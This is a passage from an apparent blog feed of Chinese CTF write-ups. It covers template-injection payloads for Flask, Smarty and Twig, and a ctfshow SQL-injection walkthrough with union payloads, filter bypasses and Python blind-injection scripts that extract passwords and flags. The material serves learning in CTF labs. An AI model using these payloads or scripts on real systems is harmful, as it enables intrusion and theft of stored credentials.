<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[2] =&gt;</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<h4 id="利用请求方式requests绕过"><a href="#利用请求方式requests绕过" class="headerlink" title="利用请求方式requests绕过"></a>利用请求方式requests绕过</h4><p>对于某些较为严格的过滤，我们可以选着用<code>requests</code>的方式绕过</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 例如</span></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125; =&gt; &#123;&#123;&#x27;&#x27;[request.args.t1]&#125;&#125;&amp;t1=__class__</span><br><span class="line"></span><br><span class="line"><span class="comment"># 又或者</span></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125; =&gt; &#123;&#123;&#x27;&#x27;[request[&#x27;args&#x27;][&#x27;t1&#x27;]]&#125;&#125;&amp;t1=__class__</span><br></pre></td></tr></table></figure>
<h2 id="smarty"><a href="#smarty" class="headerlink" title="smarty"></a>smarty</h2><p>Smarty是一个PHP的模板引擎，提供让程序逻辑与页面显示（HTML/CSS）代码分离的功能。所以对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。</p>
<h3 id="漏洞确认"><a href="#漏洞确认" class="headerlink" title="漏洞确认"></a>漏洞确认</h3><p>基本的测试可以根据上面的那张图片，也可以输入<code>&#123;$smarty.version&#125;</code>查看Smarty的版本信息。</p>
<h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123; readfile(<span class="string">&#x27;/flag&#x27;</span>) &#125;</span><br><span class="line">&#123;<span class="keyword">if</span> show_source(<span class="string">&#x27;/flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;cat ../../../flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; </span><br></pre></td></tr></table></figure>
<h3 id="常见的漏洞利用方式"><a href="#常见的漏洞利用方式" class="headerlink" title="常见的漏洞利用方式"></a>常见的漏洞利用方式</h3><h4 id="php-php-标签"><a href="#php-php-标签" class="headerlink" title="{php}{/php}标签"></a>{php}{/php}标签</h4><p>Smarty支持 使用<code>&#123;php&#125;&#123;/php&#125;</code>标签来执行被包裹其中的php指令，最常规的思路应该是先测试这个标签。</p>
<p>但是，在Smarty3的官方手册中有如下描述：</p>
<blockquote>
<p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
</blockquote>
<p>所以，一般在Smarty类中是用不了的。</p>
<h4 id="if-标签"><a href="#if-标签" class="headerlink" title="{if}标签"></a>{if}标签</h4><p>在官方文档中有如下描述：</p>
<blockquote>
<p>Smarty的<code>&#123;if&#125;</code>条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||, or, &amp;&amp;, and, is_array(), 等等，如：<code>&#123;if is_array($array)&#125;&#123;/if&#125;</code></p>
</blockquote>
<p>所以我们就可以利用这个来执行我们的php代码</p>
<p>如：{if phpinfo()}{/if}</p>
<p><img src="https://i.loli.net/2021/04/11/POjHBeb3cG2XTa9.png"></p>
<h2 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h2><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>Twig的模板注入，判断如下：</p>
49 回显7777777 => Jinja2 ，回显49 => Twig

<p>payload</p>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>拿到flag</p>
<blockquote>
<p>flag{c485b15c-f3df-4dc8-abb3-ed322ea30c66}</p>
</blockquote>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://blog.csdn.net/solitudi/article/details/107752717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161669108716780271543102%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161669108716780271543102&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-107752717.pc_v2_rank_blog_default&amp;utm_term=%E6%A8%A1%E6%9D%BF">https://blog.csdn.net/solitudi/article/details/107752717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161669108716780271543102%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161669108716780271543102&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-107752717.pc_v2_rank_blog_default&amp;utm_term=%E6%A8%A1%E6%9D%BF</a></p>
<p><a href="https://xz.aliyun.com/t/6885">https://xz.aliyun.com/t/6885</a></p>
<p><a href="https://blog.csdn.net/qq_45521281/article/details/107556915?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161812604616780261937076%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161812604616780261937076&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107556915.first_rank_v2_pc_rank_v29&amp;utm_term=smarty%E6%B3%A8%E5%85%A5">https://blog.csdn.net/qq_45521281/article/details/107556915?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161812604616780261937076%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161812604616780261937076&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107556915.first_rank_v2_pc_rank_v29&amp;utm_term=smarty%E6%B3%A8%E5%85%A5</a></p>
]]></content>
      <categories>
        <category>Web学习</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>python</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow web入门 sql</title>
    <url>/2021/02/09/sql/ctfshow%20SQL/</url>
    <content><![CDATA[<h1 id="ctfshow-SQL"><a href="#ctfshow-SQL" class="headerlink" title="ctfshow SQL"></a>ctfshow SQL</h1><p>刷一刷ctfshow的sql题，提升一下sql方面的缺陷</p>
<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>进入后题目给出了sql注入的语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;</span><br></pre></td></tr></table></figure>
<p>构造一下payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 4 %23 # 查询列数</span><br><span class="line">-1&#39; union select 1,2,3 %23 # 查回显点</span><br><span class="line">-1&#39; union select 1,database(),3 %23 # 爆库名</span><br><span class="line">-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3 %23 # 爆表名</span><br><span class="line">-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user&#39;),3 %23 # 爆列名</span><br><span class="line">-1&#39; union select 1,(select group_concat(username,0x7e,password) from ctfshow_user),3 %23 # 爆数据</span><br></pre></td></tr></table></figure>
<p>最后得到flag</p>
<blockquote>
<p>ctfshow{50392f35-7412-4264-833f-ae36542013f0}</p>
</blockquote>
<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>进入题目就看到一只可爱的小猫在晃，小猫咪虽然很可爱，但是还是得先写题</p>
<p>进到select模块的无过滤注入2</p>
<p>跟上题一样，但是回显点变为了两个</p>
<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>这题也跟171一样，但是返回结果那过滤了flag</p>
<p>也很简单，我们只需要去掉username的查询就好了，因为flag在username里</p>
<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>测试了几下发现没数据，抓包发现了一个奇怪的网址</p>
<p><a href="http://0587e034-2714-4282-bc5a-d4809dad6807.challenge.ctf.show:8080/api/v4.php?id=1">http://0587e034-2714-4282-bc5a-d4809dad6807.challenge.ctf.show:8080/api/v4.php?id=1</a></p>
<p>有回显了，但是不是我们想要的，用盲注整整</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&quot;url_here?id=1&#x27; and &quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[*] StartAttack&quot;</span>)</span><br><span class="line">    left_base = <span class="number">32</span></span><br><span class="line">    right_base = <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        left = left_base</span><br><span class="line">        right = right_base</span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">            datasql = <span class="string">f&#x27;if(ascii(substr((select password from ctfshow_user4 limit 24, 1),<span class="subst">&#123;x&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0) %23&#x27;</span></span><br><span class="line">            response = requests.get(url+datasql)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="comment"># print(f&quot;[+] left=&#123;left&#125;, right=&#123;right&#125;&quot;)</span></span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right) / <span class="number">2</span>))</span><br><span class="line">        print(<span class="string">f&quot;[*] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[+] EndAttack!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p>这次没回显了，试试时间盲注</p>
<p>这里是代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&quot;url_here?id=1&#x27; and &quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[*] StartAttack&quot;</span>)</span><br><span class="line">    left_base = <span class="number">32</span></span><br><span class="line">    right_base = <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        left = left_base</span><br><span class="line">        right = right_base</span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            datasql = <span class="string">f&#x27;if(ascii(substr((select password from ctfshow_user5 limit 24, 1),<span class="subst">&#123;x&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)%23&#x27;</span></span><br><span class="line">            response = requests.get(url+datasql)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(url+datasql, timeout=<span class="number">0.5</span>)</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="comment"># print(f&quot;[+] left=&#123;left&#125;, right=&#123;right&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">if</span> left != <span class="number">32</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right) / <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">f&quot;[*] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[+] EndAttack!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>这题简单的过滤了一下关键字，把select过滤了，但是没事</p>
<p>试试大写绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999&#39; union Select 1,2,3 %23 # 成功得到回显</span><br><span class="line">999&#39; union Select 1,(Select group_concat(username,0x7e,password) From ctfshow_user),3%23 # 爆出flag</span><br></pre></td></tr></table></figure>
<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>这题过滤了空格，用/**/绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(username,0x7e,password)&#x2F;**&#x2F;From&#x2F;**&#x2F;ctfshow_user),3%23 # 爆出flag</span><br></pre></td></tr></table></figure>
<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>过滤了空格和*号，转用%09绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999&#39;%09union%09Select%091,(Select%09group_concat(username,0x7e,password)%09From%09ctfshow_user),3%23 # 爆出flag</span><br></pre></td></tr></table></figure>
<p>后面发现，其实还可以这样写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;or&#39;1&#39;&#x3D;&#39;1&#39;%23 # 非预期解</span><br></pre></td></tr></table></figure>
<h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><p>这题把%09也给过滤了，但是还有多种姿势</p>
<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>可以用上面的非预期直接一把梭</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;or&#39;1&#39;&#x3D;&#39;1&#39;%23 # 非预期解</span><br></pre></td></tr></table></figure>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>用%0c绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;%0cor%0c1&#x3D;1%23</span><br></pre></td></tr></table></figure>
<h3 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h3><p>用()绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;or(1&#x3D;1)%23</span><br></pre></td></tr></table></figure>
<h2 id="web180-182"><a href="#web180-182" class="headerlink" title="web180-182"></a>web180-182</h2><p>把大部分空格都过滤掉了（180还把%23也过滤了</p>
<p>这里采用Y4师傅的解法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<p>解释一下就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1 # 输入进去之后</span><br><span class="line"># sql请求语句</span><br><span class="line">where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1&#39;</span><br><span class="line"># 因为and的优先级比or大，所以相当于</span><br><span class="line">where (username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&#39;) or (id&#x3D;26and&#39;1&#39;&#x3D;&#39;1&#39;)</span><br><span class="line"># 因为or左边为false，但是右边为true，所以where的条件为true</span><br><span class="line"># tips：id&#x3D;26正好还是flag的元组，实在是太女少了</span><br></pre></td></tr></table></figure>
<h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>输入ctfshow_user发现有回显，而且where可控</p>
<p>整个盲注脚本跑出flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">f&quot;(ctfshow_user)where(pass)like&#x27;<span class="subst">&#123;result+j&#125;</span>%&#x27;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>这题过滤了更多的东西，把where也过滤了，但是把空格放出来了</p>
<p>这里查到了两种解法</p>
<h3 id="解法一-1"><a href="#解法一-1" class="headerlink" title="解法一"></a>解法一</h3><p>解法一是参照Y4师傅的用right by进行查询</p>
<p>这里是盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+str_to_hex(result+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
<h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p>因为count是聚合函数，所以也可以用group by，having来查询</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user group by pass having pass like &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+str_to_hex(result+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
<h2 id="web185-186"><a href="#web185-186" class="headerlink" title="web185-186"></a>web185-186</h2><p>这题过滤了更多的东西，甚至把数字都过滤了_(¦3」∠)_</p>
<p>去搜了搜，在Y4师傅那里发现了一张图</p>
<p><img src="https://i.loli.net/2021/04/06/qQS6KvFXDW41uki.png"></p>
<p>发现可以上true</p>
<p>这里是脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Num</span>(<span class="params">n</span>):</span></span><br><span class="line">    num = <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Numstr</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">str</span> += <span class="string">&quot;chr(&quot;</span>+Num(<span class="built_in">ord</span>(s[<span class="number">0</span>]))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;,chr(&quot;</span>+Num(<span class="built_in">ord</span>(i))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user group by pass having pass like(concat(&#123;&#125;))&quot;</span>.<span class="built_in">format</span>(Numstr(result+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 0;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
<h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>绕过md5($str,true)，直接用户名填写<code>admin</code>密码为<code>ffifdyop</code></p>
<p>原理的话在这里<a href="https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160631731619195283021913&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&utm_term=md5%20%20_POST%20%20password%20%20,true&spm=1018.2118.3001.4450">[SQL绕过]md5($str,true)类型绕过</a></p>
<p>然后F12抓个包就可以看到flag了</p>
<p><img src="https://i.loli.net/2021/04/06/cLivMjtPBDVw5au.png"></p>
<h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>这题是纯知识盲区∑(っ°Д°;)っ</p>
<p>咱们可以这样子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">username=<span class="number">0</span>&amp;password=<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>为什么呢↓</p>
<p>在sql查询时，<code>where username=0</code>这样的查询中，因为数据库里的<code>username</code>都会是字符串，而在<strong>mysql</strong>中字符串与数字进行比较的时候，以字母开头的字符串都会转换成数字0，因此这个<code>where</code>条件可以把所有以字母开头的数据查出来</p>
<p>而<code>passwor=0</code>则是因为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==intval(<span class="variable">$password</span>) <span class="comment"># 弱类型比较</span></span><br><span class="line"><span class="comment"># 因为pass查出来的数据也会是以字母开头的，所有password=0可以利用弱类型比较得到flag</span></span><br></pre></td></tr></table></figure>
<p>而这样也可以把东西查出来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">username=<span class="number">1</span>&lt;<span class="number">1</span>&amp;password=<span class="number">0</span></span><br><span class="line">username=<span class="number">1</span>||<span class="number">1</span>&amp;password=<span class="number">0</span></span><br></pre></td></tr></table></figure>
<h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2>]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
